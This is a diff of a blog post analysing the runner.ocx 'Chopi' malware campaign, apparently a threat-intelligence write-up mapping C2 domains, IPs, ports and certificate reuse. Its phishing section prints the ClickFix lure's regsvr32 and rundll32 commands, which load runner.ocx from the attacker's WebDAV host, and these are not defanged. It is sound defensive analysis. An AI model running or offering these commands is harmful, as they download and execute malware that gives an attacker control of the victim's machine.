@@ -1,13 +1,13 @@
 ---
 layout: post
-title: "Part 2: Runner.ocx Threat Intelligence"
+title: "Part 2: Runner.ocx Mapping the Infrastructure"
 date: 2026-05-21
 categories: [malware, threat intelligence,]
-tags: [virustotal, shodan, censys, threafox]
+tags: [virustotal, shodan, censys, threatfox]
 ---
 ## Overview
 
-I performed threat intelligence on the runner.ocx sample. Using various threat intel web platforms, I uncovered what appears to be a dedicated threat campaign.
+Threat intelligence performed on the runner.ocx sample using VirusTotal, Shodan, and Censys uncovered what appears to be a dedicated threat campaign. This post maps the threat actor's infrastructure and concludes with an assessment of their likely motivations.
 
 ---
 
@@ -21,10 +21,10 @@ I performed threat intelligence on the runner.ocx sample. Using various threat i
 | C2 Port | `3000` |
 
 ---
-## Getting Started - Virus Total
-Virus Total is a great way to start. It reveals a gold mine of information like domain reputation, related IP addresses, https certificate details, passive DNS & community notes.
+## Getting Started - VirusTotal
+VirusTotal is a great way to start. It reveals a gold mine of information like domain reputation, related IP addresses, https certificate details, passive DNS & community notes.
 
-Here's what we discovered in our initial Virus Total analysis on the C2 domain.
+Here's what we discovered in our initial VirusTotal analysis on the C2 domain.
 
 ## DNS Resolutions
 
@@ -40,7 +40,7 @@ Here's what we discovered in our initial Virus Total analysis on the C2 domain.
 | `www.xtrafftrck[.]net` | 4/91 | `70.34.205[.]43` |
 | `xtrafftrck[.]net` | 20/91 | `70.34.205[.]43`, `208.85.17[.]52` |
 
-## Virus Total - C2 IP Pivot
+## VirusTotal - C2 IP Pivot
 The front page is painted red with 16 out of 91 security vendors flagging the domain as malicious. Digging into the details tab, we find a public IP address associated with our malware's C2. 
 
 We've also uncovered interesting tags associated with this IP. The tags were submitted by a community researcher named `JaffaCakes118`. The researcher attributes `Chopi` as a campaign tag. We'll look into this tag later in the report.
@@ -83,17 +83,17 @@ A quick search on the Vultr hosting service reveals it's cheap, accepts crypto, 
 | `4000` | Unknown | `HTTP/1.1 400 Bad Request — Connection: close` |
 
 ## Screenly[.]cam 
-Shodan provided a wealth of information. It revealed open port 3000, running a monitoring software named `Chopi Monitoring Dashboard`, which I believe is used for C2 management. The name `Chopi` ties back to the campaign tag identified by the community researcher on Virus Total. Port 4000 is an interesting find, possibly expecting a specific key, header, or handshake before responding, as it currently returns a Bad Request error. Port 22 is standard for Vultr hosted infrastructure.
+Shodan provided a wealth of information. It revealed open port 3000, running a monitoring software named `Chopi Monitoring Dashboard`, which I believe is used for C2 management. The name `Chopi` ties back to the campaign tag identified by the community researcher on VirusTotal. Port 4000 is an interesting find, possibly expecting a specific key, header, or handshake before responding, as it currently returns a Bad Request error. Port 22 is standard for Vultr hosted infrastructure.
 
 The HTTPS certificate thumbprint is an interesting artifact. Let's see what it reveals to us. We'll use another tool called Censys to investigate the certificate.
 
 ## Censys - Screenly HTTPs Certificate Thumbprint 
 Earlier in VirusTotal, we identified several domains associated with the C2 IP address. Inputting the HTTPS certificate thumbprint `f6be95351f72b24e1232c138f426aa612864696f` into Censys reveals a significant finding. The threat actor reused the screenly[.]cam certificate for aurekh[.]com, confirming shared operator ownership. As noted in our VirusTotal table, aurekh[.]com was already associated with our C2 IP address.
 
-I searched Censys for the other domains Virus Total provided but found no certificate reuse.
+I searched Censys for the other domains VirusTotal provided but found no certificate reuse.
 
-## Virus Total - Screenly
-Let's go back to Virus Total and review screenly[.]cam. This time let's look at the community notes provided by `JaffaCakes118`. He references the tags seen below. They look oddly similar to the tags we saw on our C2 domain.
+## VirusTotal - Screenly
+Let's go back to VirusTotal and review screenly[.]cam. This time let's look at the community notes provided by `JaffaCakes118`. He references the tags seen below. They look oddly similar to the tags we saw on our C2 domain.
 
 Tags: `chopi` `ClickFix` `ixwebsocket` `ocx` `WebDav` `Unknown_malware`
 
@@ -105,9 +105,9 @@ We've seen similar tags now between our C2 domain and screenly[.]cam. Let's do a
 
 Check out the results! Threat researcher `Lenny_3BO` has already submitted his own findings for the `Chopi` malware campaign. Comparing his submissions against our malware sample reveals overlapping malicious domains and IPs. Very cool!
 
-## WebDav Tag
+## WebDAV Tag
 
-WebDav is a new concept I've come to learn in my analysis. Here's what Claude taught me.
+WebDAV is a new concept I've come to learn in my analysis.
 
 WebDAV (Web Distributed Authoring and Versioning) extends HTTP to allow clients to read, write, and manage files on remote web servers. Legitimate use cases include SharePoint, remote file collaboration, and content management systems. Attackers love it for the same reason: it is a file transfer protocol hiding in plain sight, often permitted through firewalls that would block other staging mechanisms.
 
@@ -117,50 +117,55 @@ During static analysis of runner.ocx, we identified an exported function named D
 
 ## The Phish
 
-The victim is phished, usually via email. They download an attachment or follow a link within an email. That link brings them to the malicious clickfix website  (i.e, screenly[.]cam). On the clickfix website, the victim is presented with a message.
+The victim is phished, usually via email. They download an attachment or follow a link within an email. That link brings them to the malicious clickfix website  (i.e, screenly[.]cam).The victim is presented with the following message on the ClickFix page:
 
-````
-An error occurred verifying your browser. 
-To fix this, press Windows + R, paste the code below, and press Enter.
-````
+> An error occurred verifying your browser. To fix this, press Windows + R, paste the code below, and press Enter.
 
-The victim is requested to copy code which may be base64 encoded or plaintext like the example below. 
+The victim is instructed to run one of the following commands:
 
-````
+```powershell
 regsvr32.exe \\xtrafftrck.net@80\files\runner.ocx
-or
+```
+```powershell
 rundll32.exe \\xtrafftrck.net@80\files\runner.ocx,DllInstall
-````
+```
 
 ## The Attack
 
 Here's what happens.
 
-````
-1. regsvr32.exe or rundll32.exe receives the UNC path as an argument.
-
-2. Windows WebClient service mounts \\xtrafftrck.net@80 as a virtual network share over HTTP.
-
-3. regsvr32.exe loads runner.ocx directly into its own process memory from the remote share.
-
-4. DllInstall is called, which is the malware entry point.
-
+1. `regsvr32.exe` or `rundll32.exe` receives the UNC path as an argument.
+2. Windows WebClient service mounts `\\xtrafftrck.net@80` as a virtual network share over HTTP.
+3. `regsvr32.exe` loads `runner.ocx` directly into its own process memory from the remote share.
+4. `DllInstall` is called, which is the malware entry point.
 5. The implant is now executing in memory.
-````
 
 ## Command and Control
 
 Now that the malware has executed, the C2 is called and the operator controls the victim's computer.
 
-````
-AgentThread beacons to xtrafftrck[.]net:3000/ws/agent
+- `AgentThread` beacons to `xtrafftrck[.]net:3000/ws/agent`
+- Operator manages the victim machine via the `Chopi Monitoring Dashboard`
 
-Operator manages victim computer via Chopi Monitoring Dashboard
-````
+## Post-Exploitation
+
+In our previous post, we found the threat actors intended initial steps post-exploitation.
+
+| Tactic | Technique | TTP ID |
+|--------|-----------|--------|
+| Privilege Escalation | Bypass User Account Control | `T1548.002` |
+| Credential Access | OS Credential Dumping | `T1003` |
+| Credential Access | Credentials from Web Browsers | `T1555.003` |
+| Discovery | Network Service Discovery | `T1046` |
+| Lateral Movement | Remote Services | `T1021` |
+
+## Motivation
+
+The threat actor appears to operate alone, with campaign activity ranging from March to April 2026. Infrastructure domain names incorporating payment and legal services suggest deliberate targeting of financial and legal sectors. Based on the post-exploitation capabilities observed in the sample, the operator's likely objective is credential harvesting, with probable intent to monetize via dark web markets. The overall profile is consistent with a financially motivated threat actor.
 
 ## Conclusion
 
-During our threat intelligence campaign, we used various web tools to bring together disparate artifacts. Togther hey map out the attackers infrastructure, attack patterns and Opsec strengths and weaknesses. Small mistakes in operator security, like certificate reuse and consistent infrastructure patterns, are what ultimately expose a threat actor's full campaign.
+During our threat intelligence campaign, we used various web tools to bring together disparate artifacts. Together they map out the attackers infrastructure, attack patterns and opsec strengths and weaknesses. Small mistakes in operator security, like certificate reuse and consistent infrastructure patterns, are what ultimately expose a threat actor's full campaign.
 
 ## References
 
